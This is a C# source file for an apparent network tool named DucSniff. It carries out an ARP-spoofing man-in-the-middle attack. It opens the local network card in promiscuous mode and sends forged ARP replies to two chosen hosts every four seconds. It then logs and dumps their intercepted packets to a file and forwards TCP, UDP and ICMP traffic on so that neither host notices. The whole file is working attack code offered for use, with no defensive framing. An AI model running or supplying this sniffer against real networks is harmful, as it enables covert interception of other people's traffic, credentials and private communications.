using System;
using System.Collections.Generic;
using System.Net.NetworkInformation;
using System.Threading;
using PcapDotNet.Core;
using PcapDotNet.Packets;
using PcapDotNet.Packets.Ethernet;
using PcapDotNet.Packets.IpV4;
using PcapDotNet.Packets.Transport;

namespace DucSniff
{
    public class NetworkData
    {
        //Private Variables
        private static PacketCommunicator _communicator;
        //Target Data
        private static string _target1Mac;
        private static string _target2Mac;
        private static string _target1Ip;
        private static string _target2Ip;
        private static List<byte> _target1Adress;
        private static List<byte> _target2Adress;
        private static List<byte> _sourceAdress;
        private static List<byte> _target1ByteIp;
        private static List<byte> _target2ByteIp;
        private readonly DumpCreator _dumper = new DumpCreator();
        private string _ipAdress;
        private string _ipRange;
        private string _macAdress;
        private readonly PacketDevice _selectedDevice;

        //Public 
        public List<string> Traffic = new List<string>();

        public NetworkData()
        {
            // Optain Network Card
            IList<LivePacketDevice> allDevices = LivePacketDevice.AllLocalMachine;
            _selectedDevice = allDevices[0];
            ObtainIpAdress();
            OptainIpRange();
            OptainMacAdress();
        }


        private void HandlePackages()
        {
            _communicator.ReceivePackets(0, PacketHandler);
        }

        public void SetTargetData(string target1, string target2)
        {
            _target1Mac = target1.Substring(5, 17);
            _target1Ip = target1.Substring(27, target1.Length - 27);
            _target2Mac = target2.Substring(5, 17);
            _target2Ip = target2.Substring(27, target2.Length - 27);
            _sourceAdress = MacAdressToByte(_macAdress);
            _target1Adress = MacAdressToByte(_target1Mac);
            _target2Adress = MacAdressToByte(_target2Mac);
            _target1ByteIp = IpAdressToByte(_target1Ip);
            _target2ByteIp = IpAdressToByte(_target2Ip);
        }

        private void ObtainIpAdress()
        {
            //Extract local IP from Card
            string ipDesc = Convert.ToString(_selectedDevice.Addresses[1]);
            for (int i = 0; i < ipDesc.Length; i++)
                if (char.IsNumber(ipDesc[i]))
                    for (int j = i; j < ipDesc.Length; j++)
                        if (char.IsLetter(ipDesc[j]))
                        {
                            int length = j - i;
                            _ipAdress = ipDesc.Substring(i, length);
                            return;
                        }
        }

        private void OptainIpRange()
        {
            for (int i = _ipAdress.Length - 1; i > 0; i--)
                if (_ipAdress[i] == '.')
                {
                    _ipRange = _ipAdress.Substring(0, i + 1);
                    return;
                }
        }

        private void OptainMacAdress()
        {
            foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())
            {
                if (nic.NetworkInterfaceType != NetworkInterfaceType.Ethernet) continue;
                if (nic.OperationalStatus != OperationalStatus.Up) continue;
                _macAdress += nic.GetPhysicalAddress().ToString();
                break;
            }

            //Santize MacAdress 
            int counter = 0;
            for (int i = 0; i < _macAdress.Length; i++)
                if (counter == 2)
                {
                    _macAdress = _macAdress.Insert(i, ":");
                    counter = 0;
                }
                else if (char.IsLetter(_macAdress[i]) || char.IsNumber(_macAdress[i]))
                {
                    counter++;
                }
        }

        private static List<byte> MacAdressToByte(string macAdress)
        {
            List<byte> byteAdress = new List<byte>();

            for (int i = 0; i < macAdress.Length; i = i + 2)
                if (i + 1 < macAdress.Length)
                {
                    byteAdress.Add(Convert.ToByte(macAdress.Substring(i, 2), 16));
                    i++;
                }
            return byteAdress;
        }

        private static List<byte> IpAdressToByte(string ipAdress)
        {
            List<byte> byteAdress = new List<byte>();

            for (int i = 0; i < ipAdress.Length; i++)
            {
                if (ipAdress[i] == '.')
                {
                    byteAdress.Add(Convert.ToByte(ipAdress.Substring(0, i)));
                    ipAdress = ipAdress.Remove(0, i + 1);
                    i = -1;
                }
                if (i + 1 == ipAdress.Length)
                    byteAdress.Add(Convert.ToByte(ipAdress));
            }
            return byteAdress;
        }


        public void SendArpSpoof()
        {
            _communicator = _selectedDevice.Open(65536, PacketDeviceOpenAttributes.Promiscuous, 1000);

            Thread handler = new Thread(HandlePackages);
            handler.Start();
            Thread proxy = new Thread(ArpSender);
            proxy.Start();
        }

        private void ArpSender()
        {
            while (true)
            {
                _communicator.SendPacket(ArpPacket.BuildArpPacket(_sourceAdress, _target1Adress, _target2Adress, _target1ByteIp,
                    _target2ByteIp, _macAdress, _target1Mac));
                _communicator.SendPacket(ArpPacket.BuildArpPacket(_sourceAdress, _target2Adress, _target1Adress, _target2ByteIp,
                    _target1ByteIp, _macAdress, _target2Mac));

                Thread.Sleep(4000);
            }
            ;
        }

        public void StopListening()
        {
            _dumper.WriteToFile();
            _communicator.Break();
        }


        private void PacketHandler(Packet packet)
        {
            IpV4Datagram ip = packet.Ethernet.IpV4;
            UdpDatagram udp = ip.Udp;


            if (Convert.ToString(ip.Source) == _target1Ip || Convert.ToString(ip.Source) == _target2Ip)
            {
                MacAddress newMacAdress;
                Console.WriteLine(ip.Source + " ---> " + ip.Destination);

                _dumper.AddData(packet);
                if (_target1Ip == Convert.ToString(ip.Destination))
                    newMacAdress = new MacAddress(_target1Mac);
                else
                    newMacAdress = new MacAddress(_target2Mac);

                if (Convert.ToString(packet.Ethernet.IpV4.Protocol) == "Tcp")
                {
                    TcpPacket tcp = new TcpPacket();
                    _communicator.SendPacket(tcp.BuildTcpPacket(packet, newMacAdress));
                }
                if (Convert.ToString(packet.Ethernet.IpV4.Protocol) == "Udp")
                {
                    UdpPacket ufo = new UdpPacket();
                    _communicator.SendPacket(ufo.BuildUdpPacket(packet, newMacAdress));
                }
                if (Convert.ToString(packet.Ethernet.IpV4.Protocol) == "Dns")
                {
                    DnsPacket dns = new DnsPacket();
                    _communicator.SendPacket(dns.BuildDnsPacket(packet, newMacAdress));
                }
                if (Convert.ToString(packet.Ethernet.IpV4.Protocol) == "Icmp")
                {
                    IcmpPacket dns = new IcmpPacket();
                    _communicator.SendPacket(dns.BuildIcmpPacket(packet, newMacAdress));
                }
            }
        }


        public string GetIpAdress()
        {
            return _ipAdress;
        }

        public string GetIpRange()
        {
            return _ipRange;
        }

        public string GetMacAdress()
        {
            return _macAdress;
        }

        public void SetTarget1Ip(string adress)
        {
            _target1Ip = adress;
        }

        public void SetTarget2Ip(string adress)
        {
            _target2Ip = adress;
        }

        public void SetTarget1Mac(string adress)
        {
            _target1Mac = adress;
        }

        public void SetTarget2Mac(string adress)
        {
            _target2Mac = adress;
        }
    }
}